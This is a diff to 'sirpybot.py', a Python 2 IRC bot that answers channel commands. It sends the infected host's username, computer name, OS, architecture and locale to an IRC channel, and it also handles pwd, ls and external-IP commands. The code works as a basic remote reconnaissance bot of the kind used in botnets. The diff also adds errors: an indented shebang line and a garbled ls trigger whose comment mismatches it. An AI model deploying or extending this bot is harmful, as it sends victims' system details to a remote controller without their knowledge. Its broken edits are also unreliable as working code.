@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+  #!/usr/bin/env python
 '''
 Name: sirpybot.py
 Description: IRC Bot
@@ -47,20 +47,20 @@ def banner(): # Displayed when the program starts
 def ping(): # Function to respond to server pings
   ircsock.send('PONG :pingis\n')
 
-def getlogin(): # Function to get user name
-  if (str(platform.platform()))[0:3]=="Win": # If user is running Windows, get username from environment variable %USERNAME% instead
-    print 'Sending message -- User name: ' + str(os.getenv("USERNAME"))
-    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME")))
-  else:
-    print 'Sending message -- User name: ' + str(os.getlogin())
-    sendmsg(channel, 'User name: ' + str(os.getlogin()))
-
 def sysinfo(): # Function to obtain system information
   print 'Sending system information'
-  sendmsg(channel, 'Computer: ' + platform.uname()[1])
-  sendmsg(channel, 'OS: ' + platform.platform()) 
-  sendmsg(channel, 'Arch: ' + platform.machine())
-  sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
+  if (str(platform.platform()))[0:3]=="Win": # If user is running Windows, get username from environment variable %USERNAME% instead
+    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME")))
+    sendmsg(channel, 'Computer: ' + platform.uname()[1])
+    sendmsg(channel, 'OS: ' + platform.platform()) 
+    sendmsg(channel, 'Arch: ' + platform.machine())
+    sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
+  else:
+    sendmsg(channel, 'User name: ' + str(os.getlogin()))
+    sendmsg(channel, 'Computer: ' + platform.uname()[1])
+    sendmsg(channel, 'OS: ' + platform.platform()) 
+    sendmsg(channel, 'Arch: ' + platform.machine())
+    sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
 
 def get_external_ip(): # Function to get external ip address
   try:
@@ -188,9 +188,6 @@ def main():
     if ircmsg.find('PING :') != -1: # Respond to server pings
       ping()
 
-    if ircmsg.find(':User '+ botnick) != -1: # Calls getlogin() if 'User BotName' is found
-      getlogin()
-
     if ircmsg.find(':sysinfo '+ botnick) != -1: # Calls sysinfo() if 'sysinfo BotName' is found
       sysinfo()    
 
@@ -206,6 +203,6 @@ def main():
     if ircmsg.find(':pwd '+ botnick) != -1: # Calls pwd() if 'pwd BotName' is found
       pwd()
 
-    if ircmsg.find(':ls ' + botnick) != -1: # Calls pwd() if 'pwd BotName' is found
+    if ircmsg.find(':ls ' + directory + botnick) != -1: # Calls ls() if 'pwd BotName' is found
       ls(directory)
 main()
